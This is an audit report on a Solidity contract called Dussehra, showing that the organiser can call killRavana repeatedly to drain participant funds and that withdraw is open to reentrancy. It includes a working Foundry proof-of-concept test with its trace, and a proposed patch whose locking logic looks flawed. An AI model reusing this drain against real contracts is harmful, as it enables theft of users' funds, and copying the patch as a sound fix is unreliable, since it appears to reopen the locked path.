# Funds Can Be Stolen            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/main/src/Dussehra.sol

## Summary
The `killRavana`  and `withdraw` functions in the `Dussehra` contract allows the `organiser` and `Ram` to call the functions multiple times, enabling them to claim the entire amount (or more than the should claim) of funds collected from participants. This occurs due to improper handling of the multiple calls,  allowing them to exploit the contract and drain all the funds intended for distribution.

## Vulnerability Details
The vulnerability arises because there are no checks to prevent multiple calls to the `killRavana` function. This allows the `organiser` to call the function multiple times in quick succession, each time transferring half of the remaining balance to themselves, ultimately draining the entire balance of the contract.
```solidity
  function killRavana() public RamIsSelected {
        if (block.timestamp < 1728691069) {
            revert Dussehra__MahuratIsNotStart();
        }
        if (block.timestamp > 1728777669) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```
Similarly, the `withdraw` function is prone to `reentrancy` attacks. If the selected `Ram` waits for new users to deposit more Ether (so the amount of Ether equals the amoutn that should be sent to Ram), he can call the withdraw function multiple times to withdraw additional funds. This is possible only if the `killRavana` function is not called again to recalculate the amount to be sent, allowing the `Ram` to exploit the contract over time.
```solidity
 function withdraw() public RamIsSelected OnlyRam RavanKilled {
        if (totalAmountGivenToRam == 0) {
            revert Dussehra__AlreadyClaimedAmount();
        }
        uint256 amount = totalAmountGivenToRam;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to send money to Ram");
        totalAmountGivenToRam = 0;
    }
```
#### Likelihood of Occurrence
This vulnerability is highly likely to be exploited since the `organiser` has direct control over calling the `killRavana` function. Given the financial incentive, the `organiser` is motivated to exploit this vulnerability to claim all funds. The` reentrancy` issue with the withdraw function also presents a significant risk if not addressed.
## PoC
The PoC demonstrates how the `organiser` can exploit the vulnerability to drain all the funds collected by the `Dussehra` contract. It involves the following steps:

1. Two participants (`player1` and `player2`) each send `1 ether` to the contract by calling the `enterPeopleWhoLikeRam` function, resulting in a total of `2 ether` collected by the contract.
2. The` organise`r waits until the event starts (simulated by `vm.warp` to move the block timestamp forward).
3. The `organiser` selects `Ram` by calling the `selectRamIfNotSelected` function.
4. The `organiser` calls the `killRavana` function twice. Each call calculates half of the remaining balance and transfers it to the `organiser`. Since the balance is not properly managed, both calls succeed, and the `organiser` ends up with the entire `2 ether`.
```solidity
function test_ifOrganiserCanStealAllMoney() external {
    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(player2);
    vm.deal(player2, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.warp(1728691200 + 1);
    
    vm.startPrank(organiser);
    choosingRam.selectRamIfNotSelected();
    dussehra.killRavana();
    dussehra.killRavana();
    vm.stopPrank();

    assertEq(2 ether, organiser.balance);
}

```
Running the `test`, we can see `that` the test passes:
```
forge test --match-test test_ifOrganiserCanStealAllMoney -vvvv
[⠊] Compiling...
[⠒] Compiling 2 files with 0.8.20
[⠢] Solc 0.8.20 finished in 1.95s
Compiler run successful!

Ran 1 test for test/Dussehra.t.sol:CounterTest
[PASS] test_ifOrganiserCanStealAllMoney() (gas: 406243)
Traces:
  [406243] CounterTest::test_ifOrganiserCanStealAllMoney()
    ├─ [0] VM::startPrank(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [169497] Dussehra::enterPeopleWhoLikeRam{value: 1000000000000000000}()
    │   ├─ [94460] RamNFT::mintRamNFT(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84], tokenId: 0)
    │   │   └─ ← [Stop] 
    │   ├─ emit PeopleWhoLikeRamIsEntered(competitor: player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [117197] Dussehra::enterPeopleWhoLikeRam{value: 1000000000000000000}()
    │   ├─ [70560] RamNFT::mintRamNFT(player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324], tokenId: 1)
    │   │   └─ ← [Stop] 
    │   ├─ emit PeopleWhoLikeRamIsEntered(competitor: player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(1728691201 [1.728e9])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(organiser: [0xe81f335f0c35d66819c4dF203d728f579880b4b1])
    │   └─ ← [Return] 
    ├─ [33984] ChoosingRam::selectRamIfNotSelected()
    │   ├─ [2360] RamNFT::organiser() [staticcall]
    │   │   └─ ← [Return] organiser: [0xe81f335f0c35d66819c4dF203d728f579880b4b1]
    │   ├─ [361] RamNFT::tokenCounter() [staticcall]
    │   │   └─ ← [Return] 2
    │   ├─ [1224] RamNFT::getCharacteristics(1) [staticcall]
    │   │   └─ ← [Return] CharacteristicsOfRam({ ram: 0xEb0A3b7B96C1883858292F0039161abD287E3324, isJitaKrodhah: false, isDhyutimaan: false, isVidvaan: false, isAatmavan: false, isSatyavaakyah: false })
    │   └─ ← [Stop] 
    ├─ [37874] Dussehra::killRavana()
    │   ├─ [376] ChoosingRam::isRamSelected() [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [0] organiser::fallback{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [9074] Dussehra::killRavana()
    │   ├─ [376] ChoosingRam::isRamSelected() [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [0] organiser::fallback{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.40ms (227.70µs CPU time)

Ran 1 test suite in 662.73ms (1.40ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## Impact
The vulnerability of the `Dussehra` contract has severe consequences:

1. `Complete Fund Loss for Participants`: The `organiser` can repeatedly call `killRavana`, draining all funds collected from participants. This leads to a total loss for users who contributed to the `contract`.

2. `Erosion of Trust `: Participants lose confidence in the `Dussehra` protocol when they see the `organiser` and `Ram` can exploit the contract and steal funds, damaging the protocol's reputation and future participation.

3. `Compromised Fairness and Integrity`: The `organiser's` and `Ram's` ability to manipulate the contract deviates from the intended fair distribution of funds, undermining the protocol's fairness and reliability.


## Tools Used
1. Manual Code Review
2. Foundry

## Recommendations
Implement a mechanism to prevent multiple calls to the `killRavana` and `withdraw` functions after, preventing the `reentrancy` attacks.
To prevent reentrancy attacks in the `killRavana `and `withdraw` functions, we've implemented two boolean flags (`lockedToKillRavana` and `lockedToWithdraw`) along with corresponding modifiers (`LockedToKillRavana` and` LockedToWithdraw`). Here’s a brief explanation of how these recommendations work:

`Modifiers Explanation`:

1. `LockedToKillRavana` Modifier: This modifier ensures that only one instance of the `killRavana` function can execute at any given time. It sets `lockedToKillRavana` to `tru`e before executing the function and resets l`ockedToWithdraw` to `false`, preventing the `killRavana` function from being called multiple times.

2. `LockedToWithdraw` Modifier: Similarly, this modifier ensures exclusive execution of the `withdraw `function by setting `lockedToWithdraw` to` true` and `lockedToKillRavana` to `false`. This prevents `reentrancy` issues by disallowing the`withdraw` function from executing multiple times.


```diff
+  bool lockedToKillRavana;
+  bool lockedToWithdraw;

+// Modifier to prevent reentrancy when withdrawing funds
+modifier LockedToWithdraw() {
+    require(!lockedToWithdraw, "Withdraw function locked");
+    lockedToWithdraw = true;
+    lockedToKillRavana = false;
+    _;
    
+}

+// Modifier to prevent reentrancy when killing Ravana
+modifier LockedToKillRavana() {
+    require(!lockedToKillRavana, "KillRavana function locked");
+    lockedToKillRavana = true;
+    lockedToWithdraw = false;
+    _;
   
+}

+    function killRavana() public RamIsSelected LockedToKillRavana {
        if (block.timestamp < 1728691200) {
            revert Dussehra__MahuratIsNotStart();
        }
        if (block.timestamp > 1728777600) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }

+    function withdraw() public RamIsSelected OnlyRam RavanKilled LockedToWithdraw {
        if (totalAmountGivenToRam == 0) {
            revert Dussehra__AlreadyClaimedAmount();
        }
        uint256 amount = totalAmountGivenToRam;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to send money to Ram");
        totalAmountGivenToRam = 0;
    }
```
Running the test, we can see that the test now fails:
```
forge test --match-test test_ifOrganiserCanStealAllMoney
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/Dussehra.t.sol:CounterTest
[FAIL. Reason: revert: KillRavana function locked] test_ifOrganiserCanStealAllMoney() (gas: 400737)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.26ms (157.61µs CPU time)

Ran 1 test suite in 2.82ms (1.26ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/Dussehra.t.sol:CounterTest
[FAIL. Reason: revert: KillRavana function locked] test_ifOrganiserCanStealAllMoney() (gas: 400737)

Encountered a total of 1 failing tests, 0 tests succeeded
```
By addressing these issues, the `Dussehra` protocol can prevent the `organiser` and `Ram` from exploiting the contract and ensure fair distribution of funds among participants.